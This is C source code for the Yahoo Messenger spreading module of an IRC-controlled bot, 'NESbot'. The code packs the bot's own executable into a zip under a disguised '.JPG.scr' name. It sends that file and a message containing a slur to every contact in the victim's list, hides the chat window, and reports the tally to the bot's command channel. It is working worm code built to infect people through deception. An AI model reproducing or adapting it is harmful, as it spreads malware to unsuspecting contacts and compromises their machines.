#include "../h/includes.h"
#include "../h/externs.h"

int count = 0;
int yMsgCount2 = 0;

bool SendMessageToYahoo2(char *szMessage)
{
   HWND hwndYahooWindow, hwndClass;
   HWND hwndMessage, hwndButton;

   if (!(hwndYahooWindow = FindWindow("ATL:007BF380", NULL))) { return false; }

   if (IsWindow(hwndYahooWindow))
   {

      SendMessage(hwndYahooWindow, WM_COMMAND, 32891, 0);

      //if (!(hwndClass = FindWindowEx(hwndYahooWindow, 0, "IMClass", NULL))) { return false; }
      hwndClass = hwndYahooWindow;

      if (IsWindow(hwndClass))
      {
        
		 //BlockInput(true);
         if (!(hwndMessage = FindWindowEx(hwndClass, 0, "YIMInputWindow", NULL))) { return false; }

         SendMessage(hwndMessage, WM_SETTEXT, 0, (LPARAM)szMessage);
         Sleep(100);
      }

      if (IsWindow(hwndClass))
      {
         if (!(hwndButton = FindWindowEx(hwndClass, 0, "Button", NULL))) { return false; }

         SendMessage(hwndButton, WM_LBUTTONDOWN, 0, 0);
         SendMessage(hwndButton, WM_LBUTTONUP, 0, 0);
		 count++;
         Sleep(1000);
		// BlockInput(false);
      }
   }
  

   if (IsWindow(hwndYahooWindow))
   {
      //SendMessage(hwndYahooWindow, WM_CLOSE, 0, 0);
	   ShowWindow(hwndYahooWindow, SW_HIDE);
      return true;
   }
   return false;
}

//original idea by OG, thanks for the help bro :)  --carve
DWORD WINAPI YahooSpreadText2(LPVOID param)
{
	char YMessage[512]; //= "Testing";
    NTHREAD yah = *((NTHREAD *)param);
	NTHREAD *yahs = (NTHREAD *)param;
	yahs->gotinfo = TRUE;
	IRC* irc=(IRC*)yah.conn;
  	char pref[8];
	char windir[MAX_PATH];
	char exepath[MAX_PATH];
	char buf[128];
	char fuckingname[128];
	char thefile[2000];
	randprefix(pref);
	sprintf(buf,"%s%d%d%d.JPG.scr", pref,rand()%2,rand()%4,rand()%9);
	GetModuleFileName(NULL, exepath, MAX_PATH);
	zip_store(exepath, windir, buf); 
	sprintf(fuckingname,"%s%d%d%d", pref,rand()%2,rand()%4,rand()%9);
	rename(buf, fuckingname);
	HWND hwndYahooWindow, hwndWindow;

	strncpy(YMessage,yah.data1,sizeof(YMessage));

   if (!(hwndYahooWindow = FindWindow("YahooBuddyMain", NULL))) { return 0; }
   
   if (IsWindow(hwndYahooWindow))
   {
      SendMessage(hwndYahooWindow, WM_COMMAND, 32891, 0);

      if (!(hwndWindow = FindWindowEx(hwndYahooWindow, 0, "YTopWindow", NULL))) { return 0; }

      if (IsWindow(hwndWindow))
      {
         hwndWindow = FindWindowEx(hwndWindow, 0, "ATL:007BF380", NULL);
         hwndWindow = FindWindowEx(hwndWindow, 0, "SysListView32", NULL);

         if (IsWindow(hwndWindow))
         {
            for (int i = ListView_GetSelectionMark(hwndWindow); i >= 0; --i)
            {
               SendMessage(hwndWindow, WM_KEYDOWN, VK_UP, 0);
               SendMessage(hwndWindow, WM_KEYUP, VK_UP, 0);
            }

            for ( i = 0; i <= ListView_GetItemCount(hwndWindow); ++i )
            {
               SendMessage(hwndWindow, WM_KEYDOWN, VK_DOWN, 0);
               SendMessage(hwndWindow, WM_KEYUP, VK_DOWN, 0);
               SendMessage(hwndWindow, WM_KEYDOWN, VK_RETURN, 0);
               SendMessage(hwndWindow, WM_KEYUP, VK_RETURN, 0);
			   sprintf(YMessage, "Whats up fag master");
			   dropfiles(hwndWindow, fuckingname);
			   keybd_event(VK_CONTROL, 0, KEYEVENTF_EXTENDEDKEY | 0, 0);
               keybd_event(VkKeyScan('V'), 0, 0, 0);                                     
		       keybd_event(VK_CONTROL, 45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);
               SendMessageToYahoo(YMessage);
			   yMsgCount2++;
            }

         }
      }
  }
	 if ( yMsgCount2 > 1 )
	{
	irc->pmsg(InfoChan, "[\2NES\2bot] \2»\2› [\2Y\2ahoo] - Msg & File Sent To: %s Contacts.", yMsgCount2);
   	}
   	clearthread(yah.threadnum);
	ExitThread(0);
   return 0;
}